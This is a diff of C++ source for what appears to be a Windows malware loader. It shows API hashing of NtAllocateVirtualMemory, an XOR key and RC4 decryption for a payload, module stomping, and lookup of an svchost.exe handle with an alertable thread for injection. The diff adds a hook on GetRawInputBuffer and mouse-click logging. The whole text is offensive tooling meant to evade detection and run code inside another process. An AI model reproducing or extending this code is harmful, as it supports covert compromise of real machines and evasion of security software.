@@ -1,4 +1,4 @@
-﻿#include "../Headers/main.h"
+﻿#include "main.h"
 
 int main()
 {
@@ -11,21 +11,21 @@ int main()
 								  hPayloadObjectHandle		= INVALID_HANDLE_VALUE,
 								  hHeap						= INVALID_HANDLE_VALUE;
 
-	DWORD						  dwPID0					= 0x0,
-								  dwPID1					= 0x0,
-							      dwPID2					= 0x0,
-								  dwOldProtections			= 0x0,
-								  dwThreadId				= 0x0,
-								  dwThreadId1				= 0x0,
-								  dwThreadId2				= 0x0,
+	DWORD						  dwPID0					= NULL,
+								  dwPID1					= NULL,
+							      dwPID2					= NULL,
+								  dwOldProtections			= NULL,
+								  dwThreadId				= NULL,
+								  dwThreadId1				= NULL,
+								  dwThreadId2				= NULL,
 								  dwHashedString1			= 0xfbb639b7,
 								  dwHashedString2			= 0xb6e8ee02;
 
-	SIZE_T						  sBytesWritten				= 0x0,
-								  sPaddedInputSize			= 0x40,
-								  sObfuscatedSize			= 0x0,
-								  sClearPayload				= 0x0,
-								  sOriginalInputSize		= 0x40;
+	SIZE_T						  sBytesWritten				= 0x00000006,
+								  sPaddedInputSize			= 0x00000040,
+								  sObfuscatedSize			= NULL,
+								  sClearPayload				= NULL,
+								  sOriginalInputSize		= 0x00000040;
 	
 	PBYTE						  pExPayload				= nullptr,
 								  pStompingTarget			= nullptr,
@@ -55,17 +55,30 @@ int main()
 
 	CHAR						  pTargetStringToHash_1[]	= "NtAllocateVirtualMemory",
 								  pTargetStringToHash_2[]	= "ntdll.dll",
-								  pOutput[9]				= { 0x00 };
+								  pOutput[9]				= { };
 
-	static BYTE					  pTargetSubDirectory[9]	= { 0xC0, 0xA8, 0x01, 0x01, 0x0A, 0x00, 0x00, 0x01, 0x00},
+	static BYTE					  pTargetSubDirectory[9]	= { 0xC0, 0xA8, 0x01, 0x01, 0x0A, 0x00, 0x00, 0x01, 0x00 },
 								  pXorKey[8]				= { 0xB3, 0xD1, 0x72, 0x75, 0x6F, 0x6D, 0x33, 0x33 };
 
 	WCHAR						  TargetProcessName[]		= L"svchost.exe",
 								  pTargetModuleName[]		= L"ntdll.dll",
-								  pwPath[MAX_PATH] = {0x0000};
-	Context						  RC4Context_t				= { 0, 0, { 0 } };
-	RESOURCE					  resource					= { nullptr, 0 };
+								  pwPath[MAX_PATH]			= { };
+	Context						  RC4Context_t				= { };
+	RESOURCE					  resource					= { };
+	PVOID						  fnLMBClick				= static_cast<PVOID>(GetProcAddress(GetModuleHandleW(L"User32.dll"), "GetRawInputBuffer"));
 
+	pExtPayloadAddress = static_cast<PBYTE>(malloc(20));
+
+	memcpy(pExtPayloadAddress, "Hello World!\0", 13);
+
+	MapLocalMemory(pExtPayloadAddress, &pExPayload, 15, &hHeap);
+
+	LogConsoleMouseClicks();
+
+	pExPayload = static_cast<PBYTE>(VirtualAlloc(nullptr, sBytesWritten, MEM_RESERVE | MEM_COMMIT, PAGE_READONLY));
+
+	HookWithVirtualAlloc(pExPayload, fnLMBClick, sBytesWritten);
+	
 	if (!FetchAlertableThread(GetCurrentThreadId(), GetCurrentProcessId() ,&dwThreadId, &hThread)) return -2;
 
 	//printf("[!] Hashing Strings!\n");
@@ -81,6 +94,7 @@ int main()
 	FetchFileArrayW(pwPath);
 
 	//wprintf(L"\t[+] Hash Of \"%s\" is: 0x%lX\n",pTargetStringToHash, dwHashedString);
+
 	GetProcessAddressReplacementH(hModuleCustom, dwHashedString1);
 
 	if (FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwHashedString2, &hProcess) == FALSE) printf(":(\n");
